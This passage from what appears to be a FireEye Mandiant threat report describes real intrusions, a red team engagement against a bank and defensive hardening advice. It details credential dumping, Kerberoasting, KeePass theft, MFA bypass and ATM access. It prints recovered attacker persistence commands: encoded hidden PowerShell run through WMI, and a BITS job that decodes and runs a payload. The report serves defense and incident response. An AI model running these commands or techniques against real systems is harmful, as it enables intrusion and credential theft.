deploy\nCobalt Strike payloads to systems in the targeted\nenvironment. Cobalt Strike is threat emulation software\noften used by red teams and real-world attackers for\nits remote access trojan (RAT) and detection evasion\ncapabilities. The use of Cobalt Strike triggered alerts\nreviewed and forwarded to the customer by FireEye\nManaged Defense staff for deconfliction.\n\nInopportunely, the customer had an authorized red team\nassessment, conducted by a different vendor, underway in\nthe same network segment as the detected Cobalt Strike\nactivity. Many tools used by the attacker, in addition to\nCobalt Strike, are also commonly used during red team\nassessments (Fig. 9). At first glance, this could certainly\nbe overlooked as red team activity and in fact led the\ncustomer to initially attribute the detected activity to the\nongoing red team assessment. Fortunately, knowledge\nfrom prior investigations and visibility across product\ncustomers allowed Mandiant to demonstrate that the\nactivity was distinct from the red team activity, and the\nresult of a highly motivated adversary that required\nimmediate response.\n\n\nThe attacker leveraged a web content management\nsystem vulnerability to install webshell variants such as\nDEVILZSHELL, ASPXSHELL, WEBSNIFF and TABLETOP\non Internet-facing web servers. The attacker then used\n\n\n-----\n\n**Figure 9.**\nCommon toolsets\nused by TEMP.Demon.\n\n\n**Tool Name** **Attack Phase** **Description**\n\nreGeorg Establish Foothold A publicly available HTTP tunneling utility that\nallows attackers to secure a foothold in a given\nenvironment by providing an entry point to a\nvulnerable web server.\n\nCobalt Strike Maintain Persistence / Lateral A commercially available full-featured,\nMovement penetration testing tool that leverages\nfunctionality from other popular tools like\nMetasploit (penetration testing platform) and\nMimikatz (credential harvesting tool).\n\n\n-----\n\n**Figure 10.

Once the point of entry,\ncompromised accounts and accessed systems were identified, Mandiant experts\nwere confident the attacker was only in the environment for a short period of\ntime. The speed at which the attacker was installing backdoors onto the target\nsystems (10 per hour) was significant enough to warrant the following actions\nwithout further investigation:\n\n - Remove the compromised webserver\n\n - Remove compromised systems\n\n - Disable compromised accounts\n\n - Block all known CnC infrastructure\n\nThis case highlighted the complexities of untangling legitimate penetration\ntesting activity from possible simultaneously occurring attack activity.\nDespite potential confusion, decisive action is required to prevent data loss.\nPreparedness, visibility and vigilance are critical in the first hours of\na compromise.\n\n\n-----\n\n###### Finding Weaknesses  Before the Attackers Do\n\n\nFireEye Mandiant red team consultants perform\nobjectives-based assessments that emulate real cyber\nattacks by advanced and nation state attackers across the\nentire attack lifecycle by blending into environments and\nobserving how employees interact with their workstations\nand applications. Assessments like this help organizations\nidentify weaknesses in their current detection and\nresponse procedures so they can update their existing\nsecurity programs to better deal with modern threats.\n\nA financial services firm engaged a Mandiant red team\nto evaluate the effectiveness of its information security\nteam’s detection, prevention and response capabilities. The\nkey objectives of this engagement were to accomplish the\nfollowing actions without detection:\n\n\n\n- Compromise Active Directory (AD): Gain domain\nadministrator privileges within the client’s Microsoft\nWindows AD environment.\n\n- Access financial applications: Gain access to\napplications and servers containing financial transfer\ndata and account management functionality.\n\n- Bypass RSA Multi-Factor Authentication (MFA): Bypass\nMFA to access sensitive applications, such as the client’s\npayment management system.\n\n- Access ATM environment: Identify and access ATMs in a\nsegmented portion of the internal network.\n\n\n-----\n\n**Initial Compromise**\nBased on Mandiant’s investigative experience, social\nengineering has become the most common and efficient\ninitial attack vector used by advanced attackers. For this\nengagement, the red team used a phone-based social\nengineering scenario to circumvent email detection\ncapabilities and avoid the residual evidence that is often\nleft behind by a phishing email.\n\nWhile performing Open-source intelligence (OSINT)\nreconnaissance of the client’s Internet-facing\ninfrastructure, the red team discovered an Outlook Web\nApp login portal hosted at https://owa.customer.example.\nThe red team registered a look-alike domain (https://owacustomer.example) and cloned the client’s login portal\n(Fig. 11).\n\n**Outlook Web App**\n\n**Figure 11.**\nCloned Outlook **https://**\nWeb Portal.\n\n\nAfter the OWA portal was cloned, the red team identified\nIT helpdesk and employee phone numbers through further\nOSINT. Once these phone numbers were gathered, the\nred team used a publicly available online service to call\nthe employees while spoofing the phone number of the IT\nhelpdesk.\n\nMandiant consultants posed as helpdesk technicians\nand informed employees that their email inboxes had\nbeen migrated to a new company server. To complete\nthe “migration,” the employee would have to log into the\ncloned OWA portal. To avoid suspicion, employees were\nimmediately redirected to the legitimate OWA portal once\nthey authenticated. Using this campaign, the red team\ncaptured credentials from eight employees which could be\nused to establish a foothold in the client’s internal network.\n\n\n**Microsoft[™]**\n\n**®**\n\n###### Outlook Web App\n\n**Security ( show explanation** **)**\n\n**This is a public or shared computer**\n**This is a private computer**\n\n**Use the light version of Outlook Web app**\n\n**User name:**\n\n**Password:**\n\n**Sign in**\n\n**Connected to Microsoft Exchange**\n\n**© 2010 Microsoft Corporation.

To bypass this restriction,\nthe consultants downloaded the\nIBM MaaS360 Android app and\nlogged in via their phone. The device\nconfiguration process installed the\nclient’s VPN certificate (Fig. 13), which\nwas automatically imported to the\nCisco AnyConnect app—also installed\non the phone.\n\nAfter launching the AnyConnect app,\nthe red team confirmed the phone\nreceived an IP address on the client’s\nVPN. Using a generic tethering app\nfrom the Google Play store, the red\nteam then tethered a laptop to the\nphone to access the client’s internal\nnetwork.\n\n\n**Figure 12.

After reviewing this data, the\nred team identified an endpoint detection\nand response (EDR) agent which had\nthe capability to perform in-memory\ndetections that were likely to identify\nand alert on the execution of suspicious\ncommand line arguments and parent/\nchild process heuristics associated with\ncredential theft.\n\nTo avoid detection, the red team created\nLSASS process memory dumps by using\na custom utility executed via WMI. The\nred team retrieved the LSASS dump\nfiles over SMB and extracted cleartext\npasswords and NTLM hashes using\nMimikatz.[9] The red team performed this\nprocess on 10 unique systems identified\nto potentially have active privileged user\nsessions. From one of these 10 systems,\nthe red team successfully obtained\ncredentials for a member of the Domain\nAdministrators group.\n\nWith access to this Domain Administrator\naccount, the red team gained full\nadministrative rights for all systems and\nusers in the customer’s domain. This\nprivileged account was then used to\nfocus on accessing several high-priority\napplications and network segments to\ndemonstrate the risk of such an attack on\ncritical customer assets.\n\n\n**Kerberoasting abuses**\nlegitimate features\nof Active Directory\nto retrieve service\naccounts’ ticketgranting service (TGS)\ntickets and brute-force\naccounts with weak\npasswords.\n\n\n**Escalating Privileges**\nOnce connected to the internal network,\nthe red team used the Windows “runas”\ncommand to launch PowerShell as\nCUSTOMER\\user0 and perform a\n“Kerberoast”[6] attack.\n\nTo perform the attack, the red team\nqueried an Active Directory domain\ncontroller for all accounts with a service\nprincipal name (SPN). The typical\nKerberoast attack would then request\na TGS for the SPN of the associated\nuser account. While Kerberos ticket\nrequests are common, the default\nKerberoast attack tool[7] generates an\nincreased volume of requests, which is\nanomalous and could be identified as\nsuspicious. Using a keyword search for\nterms such as “Admin”, “SVC” and “SQL,”\nthe consultants identified 18 potentially\nhigh-value accounts. To avoid detection,\nthe red team retrieved tickets for this\ntargeted subset of accounts and inserted\nrandom delays between each request.\nThe Kerberos tickets for these accounts\nwere then uploaded to a Mandiant\npassword-cracking server[8] which\nsuccessfully brute-forced the passwords\nof 4 out of 18 accounts within 2.5 hours.\n\nThe red team then compiled a list of\nActive Directory group memberships for\nthe cracked accounts, uncovering several\ngroups that followed the naming scheme\nof {ComputerName}_Administrators.\nThe red team confirmed the accounts\npossessed local administrator privileges\nto the specified computers by performing\na remote directory listing of \\\\\n{ComputerName}\\C$.

The red\nteam reviewed the files and documentation on financial\napplication web servers and found an authentication\n\n**https://**\n\n**Figure 14.**\nFinancial **https://**\napplication login\nportal.\n\n\nlog indicating the following users accessed the financial\napplication:\n\n- CUSTOMER\\user1\n\n- CUSTOMER\\user2\n\n- CUSTOMER\\user3\n\n- CUSTOMER\\user4\n\nThe red team navigated to the financial application’s web\ninterface (Fig. 14) and found that authentication required\nan “RSA passcode,” clearly indicating access required an\nMFA token.\n\n\n-----\n\n**Bypassing Multi-Factor Authentication**\nThe red team targeted the client’s RSA MFA\nimplementation by searching network file shares for\nconfiguration files and IT documentation. In one file share\n(Fig. 15), the red team discovered software migration log\nfiles that revealed the hostnames of three RSA servers.\n\n**Figure 15.** **Administrator: C:\\Windows\\system32\\cmd.exe**\nRSA migration `03/07/2011 12:36 PM` `<DIR>` `Software Tokens`\nlogs from \\\\ `08/11/2011 04:01 PM` `<DIR>` `Software Tokens`\nCUSTOMER-FS01\\ `11/22/2011 12:37 PM` `<DIR>` `Software Tokens`\nSoftware. `12/16/2011 05:33 PM` `<DIR>` `Software Tokens`\n\n\n-----\n\nNext, the red team focused on identifying the user who\ninstalled the RSA authentication module. The red team\nperformed a directory listing of the C:\\Users and C:\\\ndata folders of the RSA servers, finding CUSTOMER\\\nCUSTOMER_ADMIN10 had logged in the same day\nthe RSA agent installer was downloaded. Using\nthese indicators, the red team targeted CUSTOMER\\\nCUSTOMER_ADMIN10 as a potential RSA administrator.\n\n\n**Figure 16.**\nDirectory listing\noutput.\n\n\nDirectory: C:\\Users\n\nMode LastWriteTime Length Name\n---- ------------- ------ ---d---- 9/14/2016 5:15 PM .NET v2.0\nd---- 9/14/2016 5:15 PM .NET v2.0 Classic\nd---- 9/14/2016 5:15 PM .NET v4.5\nd---- 9/14/2016 5:15 PM .NET v4.5 Classic\nd---- 9/9/2016 12:12 PM Administrator\nd---- 1/17/2017 5:44 PM CUSTOMER_ADMIN7\nd---- 9/14/2016 5:15 PM Classic.NET AppPool\nd---- 7/17/2017 4:03 PM cUSTOMER_ADMIN15\nd---- 9/14/2016 8:21 AM CUSTOMER_ADMIN10\n\n--------------------------------------------------\nDirectory: C:\\data\n\nMode LastWriteTime Length Name\n---- ------------- ------ ---d--- 9/14/2016 12:14PM WebAgent_80_x64_IIS\n-a--- 9/14/2016 8:19AM 57390141 WebAgent_80_x64_IIS.zip\n\n\n-----\n\nBy reviewing user details, the red team identified the\nCUSTOMER\\CUSTOMER_ADMIN10 account was actually\nthe privileged account for the corresponding standard\nuser account CUSTOMER\\user103. The red team then used\nPowerView[10], an open source PowerShell tool, to identify\nsystems in the environment where CUSTOMER\\user103\nwas or had recently logged in (Fig. 17).\n\n\n**Figure 17.**\nRunning the\nPowerView\nInvoke-UserHunter\ncommand.\n\n\n03/20 19:32:35 [input] powerpick Invoke-UserHunter -Username User103 -Stealth\n03/20 19:32:35 [task] Tasked beacon to rin: Invoke-userHunter -Username user103 Stealth (unmanaged)\n03/20 19:32:43 [checkin] host called home, sent: 133715 bytes\n03/20 19:32:57 [output]\nreceived output:\n\nUserDomain : CUSTOMER.example\nUserName : User103\nComputerName : CUSTOMER-FS01\nIPAddress : 10.4.32.12\nSessionFrom : 10.4.133.76\nSessionFromName : CUSTOMER-v10103.CUSTOMER.example\nLocalAdmin :\n\nUserDomain : CUSTOMER.example\nUserName : User103\nComputerName : CUSTOMER-FS01\nIPAddress : 10.4.32.12\nSessionFrom : 10.1.33.133\nSessionFromName : 10.1.33.133\nLocalAdmin :\n\n\n10 Available on GitHub.

However, since the client was\nusing software tokens, the emergency tokens still required\na user’s RSA SecurID PIN. The red team decided to target\nindividual users of the financial application and attempt to\ndiscover an RSA PIN stored on their workstation.\n\n**RSA Security Console - Welco...**\n\n**Figure 19.**\nRSA console.\n\n###### Security Console\n\nHome Identify Authentication\n\nHome\n\nWelcome You logged on:\n\nWarning: Your system has exceeded 85\n\nUser Dashboard: Quick Search\n\nQuick Links\n\nManage Users\n\nSystem Systems\n\nAssigned Tokens\n\nView Token Statistics\n\n11 Available on GitHub.

To identify these systems, the red\nteam targeted the users through their inboxes. The red\nteam set a malicious Outlook homepage for the financial\napplication user CUSTOMER\\user1 through MAPI over\nHTTP using the Ruler[11] utility. This ensured that whenever\nthe user reopened Outlook on their system, a backdoor\nwould launch.\n\nOnce CUSTOMER\\user1 had re-launched Outlook and\ntheir workstation was compromised, the red team began\nenumerating installed programs on the system and\nidentified that the target user used KeePass, a common\npassword vaulting solution.\n\n|Col1|Type the last name to see results|\n|---|---|\n\n\n-----\n\nThe red team performed an attack against KeePass to\nretrieve the contents of the file without having the master\npassword by adding a malicious event trigger to the\nKeePass configuration file (Fig. 20). With this trigger, the\nnext time the user opened KeePass a comma-separated\nvalues (CSV) file was created with all passwords in the\nKeePass database, and the red team was able to retrieve\nthe export from the user’s roaming profile.\n\n\nOne of the entries in the resulting CSV file was login\ncredentials for the financial application, which included\nnot only the application password, but also the user’s\nRSA SecurID PIN. With this information the red team\npossessed all the credentials needed to access the\nfinancial application.\n\n\n-----\n\nThe red team logged into the RSA Security Console as\nCUSTOMER\\user103 and navigated to the user record\nfor CUSTOMER\\user1. The red team then generated\nan online emergency access token (Fig. 21).

First, the red team\nprepared a list of high-value users by querying the\nmember list of potentially relevant groups such as ATM_\nAdministrators. The red team then searched all accessible\nsystems for recent logins by these targeted accounts and\ndumped their passwords from memory.\n\nAfter obtaining a password for ATM administrator\nCUSTOMER\\ADMIN02, the red team logged into the\nclient’s internal Citrix portal to access the employee’s\ndesktop. The red team reviewed the administrator’s\ndocumentation and determined the client’s ATMs could\nbe accessed through a server named JUMPHOST01, which\nconnected the corporate and ATM network segments.\nThe red team also found a bookmark saved in Internet\nExplorer for “ATM Management.” While this link could\nnot be accessed directly from the Citrix desktop, the\nred team determined it would likely be accessible from\nJUMPHOST01.\n\n\nThe jump server enforced MFA for users attempting to\nRDP into the system, so the red team used a previously\ncompromised domain administrator account, CUSTOMER\\\nADMIN01, to execute a payload on JUMPHOST01 through\nWMI. WMI does not support MFA, so the red team was\nable to establish a connection between JUMPHOST01 and\nthe red team’s CnC server, create a SOCKS proxy, and\naccess the ATM Management application without an RSA\npin. The red team successfully authenticated to the ATM\nManagement application and could then dispense money,\nadd local administrators, install new software and execute\ncommands with SYSTEM privileges on all ATM machines\n(Fig. 23).\n\n\n-----\n\n**Takeaways: Multi-factor authentication, password policy and account segmentation**\n\n\n**Multi-Factor Authentication**\nMandiant experts have seen a significant uptick in the\nnumber of clients securing their VPN or remote access\ninfrastructure with MFA. However, there is frequently\na lack of MFA for applications being accessed from\nwithin the internal corporate network. Therefore, FireEye\nrecommends that customers enforce MFA for all externally\naccessible login portals and for any sensitive internal\napplications.\n\n**Password Policy**\nDuring this engagement, the red team compromised\nfour privileged service accounts due to the use of weak\npasswords which could be quickly brute forced. FireEye\nrecommends that customers enforce strong password\npractices for all accounts. Customers should enforce a\nminimum of 20-character passwords for service accounts.\nWhen possible, customers should also use Microsoft\nManaged Service Accounts (MSAs) or enterprise password\nvaulting solutions to manage privileged users.\n\n**Account Segmentation**\nOnce the red team obtained initial access to the\nenvironment, they were able to escalate privileges in the\ndomain quickly due to a lack of account segmentation.\nFireEye recommends customers follow the “principle of\nleast-privilege” when provisioning accounts. Accounts\nshould be separated by role so normal users, administrative\nusers and domain administrators are all unique accounts\neven if a single employee needs one of each.\n\n\nNormal user accounts should not be given local\nadministrator access without a documented business\nrequirement. Workstation administrators should not be\nallowed to log in to servers and vice versa. Finally, domain\nadministrators should only be permitted to log in to\ndomain controllers, and server administrators should not\nhave access to those systems. By segmenting accounts in\nthis way, customers can greatly increase the difficulty of\nan attacker escalating privileges or moving laterally from a\nsingle compromised account.\n\n**Conclusion**\nAs demonstrated in this case study, the Mandiant red team\nwas able to gain a foothold in the client’s environment,\nobtain full administrative control of the company\ndomain and compromise all critical business applications\nwithout any software or operating system exploits.\nInstead, the red team focused on identifying system\nmisconfigurations, conducting social engineering attacks\nand using the client’s internal tools and documentation.\nThe red team was able to achieve their objectives due\nto the configuration of the client’s MFA, service account\npassword policy and account segmentation.\n\n\n-----\n\n###### Attacker Attribution,  or The Secret Knock\n\nFireEye Mandiant responded to an incident at an Asian telecommunications\ncompany that involved an extortion email sent from the CEO’s work email account\nby an external attacker. The email was sent to employees and threatened to\ndamage the company’s server infrastructure and publish or sell stolen customer\ninformation. The attacker demonstrated access to the company’s infrastructure by\nshutting down 35 non-critical servers. Though the attacker did not subsequently\nfollow through on the extortion demand, the level of control they demonstrated by\nrebooting the servers prompted an immediate and extensive investigation.\n\n\n**DLL side loading:**\nA way to make\nlegitimate software\nbehave maliciously.\n\n\nThe investigation by Mandiant consultants indicated the\nattacker had maintained access for at least three years,\nusing a combination of Meterpreter reverse shells and\nSOGU backdoors on compromised systems. From 2015 to\n2016, the attacker used variants of tools such as WMIEXEC,\nSOGU and webshells to perform lateral movement and\nstrengthen their foothold in the client’s environment.\nWMIEXEC, a WMI-based command shell utility encoded in\nVBScript, allowed the attacker to execute commands and\ncreate file shares on remote systems. SOGU enabled the\nattacker to upload and download files and execute arbitrary\nprocesses and remote shell abilities.\n\nThe use of SOGU malware is attributed to Chinese\nespionage actors only and is shared among multiple\nChinese groups. Telecommunications targeting is strategic\nand ideal for Chinese state-sponsored threat actors, as it\ngives potential insight into the communications of targets\nof interest, such as government officials (incumbent and\n\n\nopposition), religious leaders (Buddhist, Muslim), business\nexecutives and diplomats. This client organization was a\nstrategic target of Chinese state-sponsored threat actors\ngiven the increasing market pressure put on Chinese\ntelecom companies as they compete to expand their global\nbusiness and footprint.\n\nThe SOGU backdoors were loaded using DLL “side-loading.”\nTo avoid detection, each SOGU backdoor was configured\nto be loaded by a different legitimate application within\nthe client’s environment (Fig. 24). For example, the\ninvestigation identified “CrashReport.exe” as a legitimate\nand signed application. The attacker crafted a malicious\nDLL and named it “NetUtil.dll” so it would be loaded by\n“CrashReport.exe.” Once the malicious “NetUtil.dll” was\nloaded it decrypted SOGU backdoor shellcode from a file\nnamed “license.rtf.”\n\n\n-----\n\n**Figure 24.**\nSOGU Files\nCreated in C:\\\nProgramData\\\nImages.\n\n**Figure 25.**\nExample of\nrecovered WMI\npersistence\nmechanism.\n\n\n**CrashReport.exe** 994a15ff58e0ac5ee8ad83b0c94977fb 179,840\n\n\n**Consumer: SystemFailureEventConsumer (C:\\Windows\\syswow64\\**\nWindowsPowerShell\\v1.0\\powershell.exe -ep bypass -NoLogo -NonInteractive\n-NoProfile -WindowStyle Hidden -enc JABzAG8AaQBs...)\n\n\n**NetUtil.dll** 02ec6a4d2188be08a6343ac019a6cb6b 5,120\n\n\n**license.rtf** a97ea34a3bf1890339f00842bf3262cb 80,618\n\n\nIn 2017, the attacker began using WMI and BITS to maintain persistence.\nAlthough Mandiant has documented the use of WMI and BITS for years, these\npersistence mechanisms are still less common than others such as Windows\nregistry run keys, Windows services and scheduled tasks.\n\nFig. 25 contains an example of a recovered WMI persistence mechanism\nleveraged by the attacker. The attacker configured PowerShell code to execute\non an hourly-basis that decoded and executed a SOGU backdoor from the\nWindows registry.\n\n\n**Filter: SystemFailureEventFilter (SELECT * FROM __InstanceModificationEvent**\nWITHIN 3600 WHERE TargetInstance ISA ‘Win32_PerfFormattedData_PerfOS_\nSystem’)\n\n\n-----\n\nFig. 26 contains an example of a recovered BITS persistence mechanism. The\nattacker executed a BITS job to launch a malicious PowerShell script stored in\nthe Windows registry after a user logged on to the compromised system.\n\n\n**Figure 26.**\nExample of\nrecovered BITS\npersistence\nmechanism.\n\n\n@echo off\n\nbitsadmin /rawreturn /create FirewallPolicyUpdate\n\nbitsadmin /rawreturn /addfile FirewallPolicyUpdate file://c:\\windows\\system32\\\nkernel32.dll c:\\windows\\temp\\h.jpg\n\nbitsadmin /rawreturn /setnotifycmdline FirewallPolicyUpdate “rundll32.exe”\n“rundll32.exe javascript:”””\\..\\mshtml,RunHTMLApplication “””;document.\nwrite();new%%20ActiveXObject(“””WScript.Shell”””).Run(“””c:\\\\windows\\\\\nsyswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -ep bypass\n-Command $s=(gwmi Win32_OSRecoveryConfiguration).DebugFilePath -split\n‘\\\\^|’;$b=$ExecutionContext.InvokeCommand.NewScriptBlock([system.Text.\nEncoding]::Unicode.GetString([system.Convert]::FromBase64String($s[0])));icm $b\n-ArgumentList @($s[1]);Start-Sleep -Milliseconds 1000;”””,0,true)”\n\nbitsadmin /rawreturn /setpriority FirewallPolicyUpdate high\n\nbitsadmin /resume FirewallPolicyUpdate\n\n\nThe cycle of reconnaissance, credential harvesting and lateral movement\ncontinued throughout 2017 and 2018 before the attacker sent the extortion\nemail. After notifying the company of their presence by way of the extortion\nemail, the attacker continued to compromise additional systems and\ncredentials.\n\nAt one point, the attacker performed enterprise-wide Chrome credential\nharvesting using a scheduled task that launched an in-memory-only copy of\nPowerShell Mimikatz that was hosted on an internal Linux server. We believe\nthis was the attacker’s attempt to ensure future access to the environment in\nthe event of remediation activities.\n\n**Conclusion**\nWhile the extortion email was attributed to a China-based threat actor, we\nvery rarely see Chinese state-sponsored actors compromise organizations for\nfinancial gain in addition to espionage. It is notable that although the attacker\nfollowed through on their destructive threat, they did not follow up on the\nextortion demand. This behavior that does not fit the profile of a nation-state\nactor or a financially motivated actor, demonstrating how the lines between the\ntwo are blurring.\n\n\n-----\n\n1298234298263987\n4293847293847293\n8472938472938472\n9387429837429834\n7293847293568420\n3948203948029362\n9387492387429387\n9283473847293847\n2938479129823429\n\n\n###### DEFENSIVE TRENDS\n\n1298234298263987\n4293847293847293\n8472938472938472\n9387429837429834\n7293847293568420\n3948203948029362\n9387492387429387\n9283473847293847\n2938479129823429\n\n\n-----\n\n###### Premediation Preventative Best Practices from the Frontlines of Incident Response\n\n\n**Premediation:**\nProactively\nimplementing common\nremediation-focused\ninitiatives.\n\n\n**Proactive Remediation**\nThroughout 2018, FireEye Mandiant consultants led multiple\nremediation efforts to contain and eradicate attackers from\nenvironments. In these engagements, consultants help\nclients implement security configuration and architectural\nenhancements to secure their environments, often in\na relatively short timeframe under stressful conditions.\nCommon remediation activities include:\n\n- Enforcing advanced audit policy configurations on\nendpoints using Group Policy to ensure optimized\nvisibility for investigative and incident response teams.\n\n- Hardening of environments to limit lateral movement\ncapabilities using a combination of network\nsegmentation and endpoint hardening.\n\n- Implementing security controls to minimize remote\nusage of local accounts across endpoints, using a\ncombination of Microsoft Local Administrator Password\nSolution (LAPS) and Group Policy configurations.\nThe built-in local administrator account is a common\naccount targeted by attackers for lateral movement\nacross endpoints.\n\n- Reducing the exposure of account artifacts pertaining to\nprivileged accounts across endpoints.\n\n- Preparing for and executing coordinated enterprisewide password resets with clients.\n\n\nIn many instances, if hardened security configurations,\ntested processes and architectural controls had been in\nplace before an incident, the incident could have been\nprevented or rapidly contained. FireEye has coined the\nterm “premediation” to refer to the proactive implementation\nof security configurations and architectural enhancements\nthat are commonly implemented as part of remediation\nefforts.\n\nTo help organizations align focus and prioritize reviewing,\nvalidating and enhancing their security controls,\npremediation concepts can be organized into four distinct\ncategories:\n\n- General posturing\n\n- Privileged account management\n\n- Active Directory hardening\n\n- Endpoint hardening\n\n\n-----\n\n**General Posturing**\nBefore an environment can be properly hardened and secured, organizations must first ensure\nthat visibility and detection mechanisms are tuned for the current environment to reduce\npotential operational impacts. This, in turn, helps ensure that any planned security controls will\nbe effective in mitigating risks related to an attacker compromising the existing infrastructure\nand underlying data.\n\n**Visibility**\nWe frequently observed that deficiencies in organizations’ understanding of and\nvisibility into their own environment directly led to failures in their ability to detect and\nrespond to breaches. This allowed attackers to access critical systems without detection\nand consequently hampered organizations’ ability to implement eradication steps in a\nshort timeframe.\n\n**Common questions organizations should ask:**\n\n\nHave we documented all attack vectors that can be used by someone external or internal to\nour organization to gain access to our systems and data?\n\n\nWhat single-factor applications are external facing and can be used for authentication from\nuntrusted locations to access data?\n\n\nHave we tested any multi-factor authentication we have in place, to see if it can be circumvented\nby an attacker?\nWould we be able to detect such activity now?\n\nDo we have proper security tools in place to alert us to evidence of an active or historic\ncompromise within our environment?\n\nHave we tested the effectiveness of our existing visibility and security controls, to ensure that our\ntechnology investment is optimized to reduce risk?\n\n\n-----\n\n**Password Resets**\nBreached organizations often\nexecute an enterprise-wide password\nreset during the breach recovery\nprocess. Changing passwords for\ndomain-based service accounts\nwas the single biggest contributor\nto delayed breach remediation for\nMandiant investigations in 2018. This\nwas primarily due to lack of both\nknowledge and documentation of\nservice accounts.\n\nFor faster breach response,\norganizations should document all\ndomain-based service accounts\nwith the following information\n(at a minimum):\n\n\nAccount name\n\nAccount function\n\nSystems where the account is used and required to be granted\nlogon permissions\n\nLevel of privilege or access required\n\nBusiness and technical owner of the system, application or account\n\nSystem and application that uses the account\n\nProcess for changing the account password – and updating relevant\nconfiguration settings to reflect the new password\n\n\n**Preparing for and executing an enterprise-wide password reset may also include these common steps:**\n\nEnhancing or creating password policies to enforce different password complexity requirements for specific account\n\n###### 1 types (e.g., user, service, privileged).\n\nIdentifying and documenting all dormant accounts which should ideally be disabled during the enterprise-wide\n\n###### 2 password reset—until the respective account user can reset the password.\n\nDocumenting and testing a plan for enforcing an automated password reset for standard user accounts. Privileged\nand service accounts typically require a manual password reset, heightening the necessity to accurately identify the\n\n###### 3 scope of these accounts within an environment. This planning phase should include a review of the scope of privileges\n\nassigned to these accounts and remove (deprivilege) any accounts that do not require administrative privileges within\nthe environment.\n\n###### 4 Planning for the implementation of MFA, including steps for enrolling users, monitoring enrollment status and devices\n\ncorrelating to each account and enforcing MFA mechanisms for external-facing services.\n\nPerforming a Kerberos (“krbtgt”) password reset before resetting passwords for most other accounts within the\n\n###### 5 environment.\n\n\n-----\n\n**Network Segmentation and Logs**\nVisibility, logging, and detection gaps should be identified\nat both the network and endpoint layers. Validation should\nbe initiated for logs specific to critical assets. Proper\nlogging configurations should enable identification of\nabnormal connections and access events.\n\nEnsure that logging configurations collect data relevant to:\n\n- Logon and logoff activity, such as Kerberos Service\nTicket Operations\n\n- Process execution events, such as command line logging\n\n- Directory Service Access and Changes (helps detect\npotential DCShadow and DCSync activity in Active\nDirectory environments)\n\n- Security Group Management activity (captures\nmodifications to security groups)\n\n**For network posturing:**\n\n\n\n- PowerShell activity, such as Module, ScriptBlock and\nTranscription logging\n\n- DNS queries and events, such as DNS Analytical\nLogging can be used to enhance visibility of DNS\nactivity when Windows servers are used to provide\nclient name resolution\n\n- Remote access and VPN connections\n\n- NetFlow data, including both north/south and east/west\ntraffic\n\n- Proxy servers, firewalls and egress communications\n\n- Load balancers, including capturing X-Forwarded-For\n(XFF) HTTP headers\n\n- Access and authentication to cloud-hosted services (e.g,\nMicrosoft Azure, Office 365, Amazon Web Services)\n\n\nDesign the network architecture to\nsegment and restrict communications\nbetween systems based on the function of\nsystems and the type of data that reside on\nsystems and within specific applications.\n\n\nEnsure proper segmentation is configured\nfor administrative and management systems\n(e.g., jump boxes), which are accessed by\nprivileged users and used for security and\nadministration purposes.\n\n\nFor third-party connectivity into an\nenvironment, ensure that segmented\nenclaves are used to restrict access to\nonly the systems and data required per\ncontractual obligations for third-party\ncontractors or vendors.\n\n\n-----\n\n**Tiered Model**\n\nModel in which\nprivileged accounts can\nonly be used to access\nsystems that reside\nwithin a tier that is\ndefined by the system’s\nfunction and role within\nan environment.\n\n\n**Privileged Account Management**\nPrivileged account management is one of the most important considerations for\norganizations. During Mandiant incident response investigations in 2018, a common theme\nwe observed was the compromise of highly privileged account credentials in memory on\nendpoints where an attacker established a presence. In fact, many “patient zero” endpoints\nwere systems assigned to standard users where a highly privileged account (e.g., Domain\nAdmin permissions) was used at one point to log on and assist a user.\n\nWhen an account is used to log on to a system (interactively or even remotely using\nRemote Desktop), credentials can remain in LSASS memory until a system has been\nrebooted. If an attacker compromises an endpoint where a privileged account previously\nlogged on, an attacker can obtain credential artifacts (password or hashes) from memory\nto laterally move throughout an environment.\n\n**Tiered Model**\nThe core of premediation guidance is for organizations to use security controls to restrict\nthe use of privileged accounts on endpoints with a tiered model for administration (Tier 0\n– Tier 2).[12] Organizations should use the following IRM principles to establish processes for\nprivileged account usage within an environment:\n\n- **Identify and understand the scope of privileged accounts that exist within the**\nenvironment\n\n- **Restrict how and where privileged accounts can be used within the environment**\n\n- **Monitor and enforce detection when attempts are made to use privileged accounts**\n\n\n###### ACCOUNT HARDENING\nOrganizations should use either Group Policy or Authentication Silos to reduce the scope of privileges assigned to users\nand services and limit where privileged accounts can be used within an environment.\n\n\n\n- Inherent to modern Active Directory environments,\nMicrosoft’s Local Administrator Password Solution\n(“LAPS”) provides centralized management and\nrandomization for the password of the built-in local\nadministrator account across domain joined computers.\n\n- With KB2871997, Microsoft introduced “S-1-5-114:\nNT AUTHORITY\\Local account and member of\nAdministrators group,” which provides an effective way\nto quickly use Group Policy settings to restrict remote\nlogons using any local privileged account that may exist\non an endpoint.\n\n12 Microsoft (October 11 2016) Securing Privileged Access Reference Material\n\n\nStandard user accounts should not require administrative\nprivileges to perform daily job functions and service\naccounts should operate with the lowest privilege level\npossible on an endpoint. Accounts delegated with local\nor domain-based privileged access should be explicitly\ndenied access to common endpoints, which are often the\ninitial access vector for an attacker.\n\n\n-----\n\n**Figure 27.**\nGroup Policy\n\n**Policies**\n\nconfiguration\nsettings.\n\nTo restrict the exposure of service\nand privileged accounts within an\nenvironment navigate to Computer\nConfiguration > Policies > Windows\nSettings > Security Settings > Local\nPolicies > User Rights Assignment\n\n**Tips for account hardening**\n\n- Identify the scope of privileged accounts that exist\nwithin the environment.\n\n–– This not only includes accounts that are directly\nmembers of built-in privileged groups – but also\nnested groups and inherited group memberships for\naccounts, which could provide access rights for a\npath for privileged access.\n\n- Enforce a Tiered Architecture Model for restricting\naccess using privileged accounts.\n\n- Implement and use designated and isolated Jump\nBoxes / Privileged Access Workstations (PAWS) - for\nperforming administrative functions and tasks with\nspecific accounts designated for usage within each tier.\n\n- Use the Protected Users Active Directory security group\nfor housing privileged and sensitive accounts.\n\n- Use Restricted Admin Remote Desktop or Remote\nCredential Guard when remote desktop protocol (RDP)\nis used for administrative access to endpoints.\n\n\n\n- Use separate VPN profiles for administrators (including\naccounts that have privileged access) – which include\nMFA requirements and stateful access-control lists to\nfurther restrict remote access to Jump Boxes / PAWS\nwithin the environment.\n\n- Use a Privileged Access Management (PAM) solution—\nwhich supports automated password rotation,\ntime-based access-control conditions (just-in-time\nadministration), and verbose logging and auditing of\nwhen privileged accounts are accessed and used.\n\n- For cloud administration, use separate and dedicated\naccounts that are not used for managing and\nadministering on-premise systems and architecture.\n\n–– At a minimum, do not 